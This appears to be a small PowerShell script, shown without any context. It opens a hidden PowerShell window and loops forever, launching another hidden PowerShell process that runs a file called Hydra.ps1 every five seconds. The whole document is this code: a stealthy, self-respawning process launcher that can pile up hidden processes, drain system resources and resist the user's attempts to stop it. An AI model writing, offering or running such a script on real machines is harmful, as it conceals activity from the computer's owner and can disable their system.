Powershell.exe -windowstyle hidden {
    While($true){
        Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
        Start-Sleep -Seconds 5
    }
}